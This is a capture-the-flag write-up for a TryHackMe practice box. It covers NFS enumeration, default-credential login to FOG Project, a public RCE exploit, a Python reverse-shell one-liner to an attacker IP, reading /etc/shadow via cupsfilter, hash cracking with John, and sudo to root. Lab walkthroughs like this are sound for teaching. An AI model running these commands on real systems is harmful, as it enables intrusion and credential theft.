# Corgi
Try this OSCP level practice box by JSON SEC at https://tryhackme.com/room/corgi

## nmap TCP scan
The first thing we do on any vulnerable box is a nmap scan. I went with a TCP-SYN scan with default scripts and all ports

`nmap -sS -sC -p- <TARGET-IP>`
![nmap scan pt1](Images/nmap_1.png)
![nmap scan pt2](Images/nmap_2.png)

## NFS
From this scan we can see that nfs is installed on the server, lets use `showmount` to see if there are any shares we can mount to our system.
![showmount](Images/showmount.png)
looks like there are 2 shares we can mount, lets use mount one of them and have a look around
![mount](Images/mount.png)

## FOG Project
After looking around we found this fog file, after some quick google searching I found this documentation for something called 'FOG project'
![FOG documentation](Images/FOG_1.png)
And going to `<TARGET-IP>/fog` takes us to a login page
![FOG login](Images/FOG_2.png)
Now that we have a login page we need some credentials. before we try anything else lets try and find some default creds on google.
![FOG default creds](/Images/FOG_3.png)
Lucky for us these default credentials worked and we are now logged in to the FOG dashboard
![FOG dashboard](Images/FOG_4.png)

## RCE Exploit
Now that we have access to a dashboard lets have a look on exploit.db to see if there are any known exploits for the version of FOG that is installed.
![search on exploitdb](Images/exploit_1.png)
Lucky Break, there is a RCE exploit here https://www.exploit-db.com/exploits/49811
![exploit contents](Images/exploit_2.png)
Lets try and use this RCE exploit and test to see if we can run commands on the server before we try and gain access through a remote shell.
![before file upload](Images/exploit_3.png)
![after file upload](Images/exploit_4.png)
Running the hostname command to test if file upload worked
![testing RCE](Images/exploit_5.png)

## Reverse Shell & Privilege Escalation
Now that we have RCE lets get our reverse shell up and running
`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
![getting reverse shell](Images/rev_shell_1.png)
And stabilise the shell
![stabilising reverse shell](Images/rev_shell_2.png)

now that we have a working and stable reverse shell, we need to be able to read the /etc/shadow and /etc/passwd files.
First lets find out what binaries we have access to with `find`

`find / -perm /4000 2>/dev/null`
![available binaries](Images/binaries.png)
After having a search on https://gtfobins.github.io/, we found that the cupsfilter binary has a File read vulnerability, and we can use this to read the /etc/shadow and /etc/passwd files

![result on GTFObins](Images/cupsfilter.png)
`cupsfilter -i application/octet-stream -m application/octet-stream /etc/passwd`
![reading the /etc/passwd file pt1](Images/passwd_1.png)
![reading the /etc/passwd file pt2](Images/passwd_2.png)
`cupsfilter -i application/octet-stream -m application/octet-stream /etc/shadow`
![reading the /etc/shadow file pt1](Images/shadow_1.png)
![reading the /etc/shadow file pt2](Images/shadow_2.png)
Lets copy the contents of the files onto our host computer, then use unshadow and johntheripper to get the passwords

`unshadow passwd.txt shadow.txt`
`john --wordlist=/usr/share/wordlists/rockyou.txt`
![cracking the hashes](Images/cracked.png)

So now we have a login, lets `su` into the new user and see what permissions they have.sudo 
![checking sudo -l](Images/sudo.png)

It looks like they can run any command, lets try to get into the root account and find the user and root hashes

![sudo su and user hash](Images/usr_hash.png)
![root hash](Images/root_hash.png)